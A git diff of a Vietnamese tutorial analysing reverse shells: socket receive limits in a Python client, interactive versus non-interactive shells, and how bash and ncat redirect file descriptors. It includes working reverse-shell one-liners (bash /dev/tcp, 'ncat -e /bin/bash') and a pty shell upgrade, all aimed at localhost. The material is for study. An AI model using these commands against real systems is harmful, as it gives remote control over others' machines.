@@ -287,11 +287,11 @@ if __name__ == '__main__':
 ```
 </details>
 
-# 3. Interactive Shell và Non-Interactive Shell
-## Hạn chế thứ nhất
-- Hãy thử nghiệm reverse shell theo 2 kịch bản sau:
-    1. Chạy server và client trong code `02.simple_rev_shell`, sử dụng lệnh `ls -lah /usr/bin/`
-    2. Sử dụng `netcat` tạo server (ví dụ `nc -nvlp 9191`), và chạy client trong `02.simple_rev_shell`, chạy lệnh `ls -lah /usr/bin/`
+# 3. Phân tích hạn chế kỹ thuật của code đã viết.
+## Vấn đề nhận dữ liệu bên phía server
+Hãy thử nghiệm reverse shell theo 2 kịch bản sau:
+  1. Chạy server và client trong code `02.simple_rev_shell`, sử dụng lệnh `ls -lah /usr/bin/`
+  2. Sử dụng `netcat` tạo server (ví dụ `nc -nvlp 9191`), và chạy client trong `02.simple_rev_shell`, chạy lệnh `ls -lah /usr/bin/`
 
 <details>
 <summary>Kết quả thử nghiệm</summary>
@@ -319,12 +319,8 @@ while True:
     if len(response) < BUFF_SIZE:
         break
 ```
-</details>
 
-<details>
-<summary>Giải thuật ở trên có lỗi gì không?</summary>
-
-Giải thuật ở trên có 1 điểm yếu trong logic: nếu chunk cuối có độ dài chính xác là `BUFF_SIZE`, cụ thể hơn: `len(data) + len('\n') == BUFF_SIZE`, chương trình tiếp tục thực hiện lấy `conn.recv(1024)` và bị treo.
+Tuy nhiên, giải thuật ở trên có 1 điểm yếu trong logic: nếu chunk cuối có độ dài chính xác là `BUFF_SIZE`, cụ thể hơn: `len(data) + len('\n') == BUFF_SIZE`, chương trình tiếp tục thực hiện lấy `conn.recv(1024)` và bị treo.
 
 Nguyên nhân dẫn đến việc bị treo là do [Blocking Mode của socket](https://en.wikipedia.org/wiki/Berkeley_sockets#Blocking_and_non-blocking_mode) không return trừ khi nó nhận được dữ liệu. Trong khi đó, Non-Blocking return bất cứ dữ liệu nào trong buffer và lập tức tiếp tục. Chế độ Non-Blocking có thể gây ra lỗ hổng [Race-Condition](https://en.wikipedia.org/wiki/Race_condition). Tuy nhiên, ta có thể bật chế độ non blocking trong trường hợp này để lấy toàn bộ dữ liệu mà không lo bị treo. Ta sẽ trả lại chế độ blocking như cũ sau khi lấy hết dữ liệu.
 
@@ -358,34 +354,24 @@ while True:
 Dòng `output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)` lấy toàn bộ dữ liệu từ output lưu vào 1 biến và gửi đi. Trên lý thuyết, nếu dữ liệu output quá lớn có thể ảnh hưởng đến lượng memory mà client sử dụng, cũng như lưu lượng mạng để truyền tải file.
 </details>
 
-## Hạn chế thứ 2.
-Đầu tiên, chạy reverse shell với bash `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9191 <&1'` rồi thử chạy `vi /tmp/hehe` từ phía server rồi thoát editor. Sau đó thử tương tự nhưng phía client chạy reverse shell bằng py đã viết.
+## Vấn đề truyền dữ liệu bên phía client
+Thử nghiệm chạy lệnh `for i in $(seq 1 5); do echo "$i"; sleep 1; done` trên cả 2 reverse shell.
 
 <details>
-<summary>Nhận xét sự khác biệt</summary>
+<summary>Nhận xét kết quả?</summary>
 
-Sau lệnh vi, phía server bị treo. Nếu thử list các process trên phía client, ví dụ `ps -aux | grep hehe`, ta thấy process vẫn đang chạy
+- Ở phía interactive shell, output được đưa ra liên tục.
+- Ở phía non-interactive shell, server ngưng một lúc rồi in ra toàn bộ output
+=> Như vậy, output ở phía interactive shell là real-time. Nguyên nhân bởi vì đoạn code `output = subprocess.run()` chờ lệnh thực hiện xong hoàn toàn mới lấy output và gửi về phía server.
 
-```
-dmknght   150065  0.0  0.0   2580  1536 pts/4    S+   08:05   0:00 /bin/sh -c vi /tmp/hehe
-dmknght   150066  0.0  0.0  91704 13568 pts/4    Sl+  08:05   0:00 vi /tmp/hehe
-```
-
-Điều này có nghĩa là vì một lý do nào đó, process vẫn đang chạy nhưng phía server không thể điều khiển được. (ngay cả khi sử dụng **Ctrl+C** để stop server, phía client vẫn tiếp tục chạy process cho đến khi bị kill.)
 </details>
 
-## Interactive, Non-Interactive và nâng cấp.
-Từ [định nghĩa các chế độ hoạt động của bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell)#Modes), ta có thể rút ra được vài điểm chính sau:
-- Interactive mode (chế độ tương tác), thực hiện lấy dữ liệu từ stdin, đưa stdout và stderr ra stdin.
-- Non-Interactive mode (chế độ không tương tác) sẽ thực hiện 1 lệnh hoặc chuỗi lệnh mà không cần người dùng tương tác.
+# 4. Output redirection và reverse shell
+Đối với reverse shell như ncat hay bash, tại sao phía server nhận được dữ liệu từ stdout?
 
-<details>
-<summary>Vậy đối với reverse shell như ncat hay bash, tại sao phía server nhận được dữ liệu từ stdout?</summary>
-
-#### Đối với lệnh bash, ta có những điểm sau:
-  1. Sử dụng flag `-i` để sử dụng interactive mode
-  2. Sử dụng [Tính năng redirection để redirect stdout và stderror tới TCP socket](https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Redirecting-Standard-Output-and-Standard-Error). *Note: Để sử dụng tính năng này, [bash cần được compile với flag --enable-net-redirections](https://unix.stackexchange.com/a/217488)*.
-  3. Sử dụng [duplicate file descriptors của redirection trong bash](https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Duplicating-File-Descriptors) để redirect **output của socket** vào **stdin của bash**.
+#### Phân tích reverse shell sử dụng bash
+  1. Sử dụng [Tính năng redirection để redirect stdout và stderror tới TCP socket](https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Redirecting-Standard-Output-and-Standard-Error). *Note: Để sử dụng tính năng này, [bash cần được compile với flag --enable-net-redirections](https://unix.stackexchange.com/a/217488)*.
+  2. Sử dụng [duplicate file descriptors của redirection trong bash](https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Duplicating-File-Descriptors) để redirect **output của socket** vào **stdin của bash**.
 
 Như vậy, ta có thể sử dụng [procfs](https://en.wikipedia.org/wiki/Procfs) để kiểm tra `file descriptor` của tiến trình đang chạy. Ta có thể so sánh file descriptor của tiến trình terminal emulator mới và reverse shell chạy bằng bash:
 - Với tiến trình terminal emulator mới:
@@ -425,7 +411,7 @@ bash      157571                           dmknght    1u     IPv4            213
 bash      157571                           dmknght    2u     IPv4            2133132         0t0      TCP localhost:48810->localhost:9191 (ESTABLISHED)
 ```
 
-#### Đối với ncat
+#### Phân tích reverse shell sử dụng ncat
 Đối với ncat, việc sử dụng file redirection có sự khác biệt:
 
 ```
@@ -441,20 +427,67 @@ l-wx------ 1 dmknght dmknght 64 Dec  9 09:50 5 -> 'pipe:[2177955]'
 lr-x------ 1 dmknght dmknght 64 Dec  9 09:50 6 -> 'pipe:[2177956]'
 ```
 
-Thật vậy, `ncat` không sử dụng việc redirect stdin và stdout tới pipe. Nguyên nhân là khi [thực hiện lệnh hệ thống](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L150), `ncat` sử dụng [fork](https://man7.org/linux/man-pages/man2/fork.2.html) để tạo một tiến trình mới và sử dụng [pipe](https://man7.org/linux/man-pages/man2/pipe.2.html) để communicate với nó. Dữ liệu đưa qua socket sử dụng [dup2](https://man7.org/linux/man-pages/man2/dup2.2.html) để sao chép file descriptor của process con và của socket connection.
-TODO làm rõ hơn vấn đề redirection vì code của ncat đang chưa clear phần redirection (struct / mảng child_stdin ở đâu ra?)
+Như vậy, `ncat` không sử dụng việc redirect stdin và stdout trực tiếp từ stdin/stdout/stderr socket. Phương pháp ncat sử dụng như sau
+1. [Khởi tạo một tiến trình con](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L150) sử dụng [fork](https://man7.org/linux/man-pages/man2/fork.2.html)
+2. [Khởi tạo luồng giao tiếp dữ liệu](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L177) bằng cách sử dụng [pipe](https://man7.org/linux/man-pages/man2/pipe.2.html)
+3. [Giao tiếp giữa tiến trình cha và tiến trình con](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L177) bằng Dup2. Đây là wrapper của hàm [dup2](https://man7.org/linux/man-pages/man2/dup2.2.html) có tác dụng duplicate [file descriptor](https://en.wikipedia.org/wiki/File_descriptor).
+4. [Thực thi lệnh](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L215) với hàm [execve](https://man7.org/linux/man-pages/man2/execve.2.html) khi sử dụng flag `-e`
+5. Ghi dữ liệu từ pipe ra socket connection sử dụng [write_loop](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L272) hoặc [ncat_send](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L291)
 
-</details>
+
+#### Sử dụng output redirection cho reverse shell python (TODO)
+
+# Interactive và non-interactive shell.
+Đầu tiên, chạy reverse shell với bash `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9191 <&1'` rồi thử chạy `vi /tmp/hehe` từ phía server rồi thoát editor. Sau đó thử tương tự nhưng phía client chạy reverse shell bằng py đã viết.
 
 <details>
-<summary>Liệu thời điểm lấy output có khác nhau không?</summary>
-Chạy: `for i in $(seq 1 5); do echo "$i"; sleep 1; done` trên reverse shell và shell thường (hoặc thử reverse shell) => interactive chạy real time còn non-interactive đợi chạy xong, lấy output và gửi
+<summary>Nhận xét sự khác biệt</summary>
+
+Sau lệnh vi, phía server bị treo. Nếu thử list các process trên phía client, ví dụ `ps -aux | grep hehe`, ta thấy process vẫn đang chạy
+
+```
+dmknght   150065  0.0  0.0   2580  1536 pts/4    S+   08:05   0:00 /bin/sh -c vi /tmp/hehe
+dmknght   150066  0.0  0.0  91704 13568 pts/4    Sl+  08:05   0:00 vi /tmp/hehe
+```
+
+Điều này có nghĩa là vì một lý do nào đó, process vẫn đang chạy nhưng phía server không thể điều khiển được. (ngay cả khi sử dụng **Ctrl+C** để stop server, phía client vẫn tiếp tục chạy process cho đến khi bị kill.)
 </details>
 
-
+Từ [định nghĩa các chế độ hoạt động của bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell)#Modes), ta có thể rút ra được vài điểm chính sau:
+- Interactive mode (chế độ tương tác), thực hiện lấy dữ liệu từ stdin, đưa stdout và stderr ra stdin.
+- Non-Interactive mode (chế độ không tương tác) sẽ thực hiện 1 lệnh hoặc chuỗi lệnh mà không cần người dùng tương tác.
+(TODO bổ sung phần flag -i 1. Sử dụng flag `-i` để sử dụng interactive mode)
 ## Kiểm tra, chuyển đổi sang Interactive Mode
-TODO: kiểm tra: `echo $-`
-TODO: nâng cấp shell
+Vậy, làm sao để có thể biết được shell hiện tại đang có interactive mode hay không? Tiến hành thử nghiệm bằng việc m ở đồng thời 3 reverse shell. Trên Linux, có thể sử dụng Tilix hoặc terminal emulator hỗ trợ chia nhiều cửa sổ.
+1. Mở reverse shell sử dụng python với server dùng lệnh `nc -nvlp 9191` và chạy script python
+2. Mở reverse shell sử dụng ncat với server `nc -nvlp 9192` và client `ncat -e /bin/bash 127.0.0.1 9192`
+3. Mở reverse shell sử dụng bash với server `nc -nvlp 9193` và client `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9193 <&1'`
+
+Sau đó, tiến hành thử nghiệm với một số gợi ý thu thập được từ internet:
+- Xem [các flag hiện tại của shell](https://www.gnu.org/software/bash/manual/bash.html#Special-Parameters-1) bằng lệnh `echo $-`
+  <details>
+  <summary>Kết quả thử nghiệm</summary>
+
+  - Connect thứ nhất cho kết quả là dòng trống.
+  - Connect thứ 2 cho kết quả là `hBs` (nếu sử dụng `-e /bin/sh` thay vì `-e /bin/bash` thì kết quả là `s`)
+  - Connect thứ 3 cho kết quả là `himBHs`
+
+  => Như vậy, `echo $-` có thể sử dụng để phân biệt. Non-Interactive sẽ trả về 1 dòng trống.
+  </details>
+
+- Kiểm tra [shell prompt](https://wiki.linuxquestions.org/wiki/Shell_prompt) với lệnh `echo $PS1`
+  <details>
+  <summary>Kết quả thử nghiệm</summary>
+
+  - Connect thứ nhất cho kết quả là `$`
+  - Connect thứ 2 cho kết quả là `$`
+  - Connect thứ 3 cho kết quả là prompt của shell hiện tại
+
+  </details>
+
+- Thử nghiệm với `tty`
+
+
 ```
 import pty
 pty.spawn("/bin/bash")
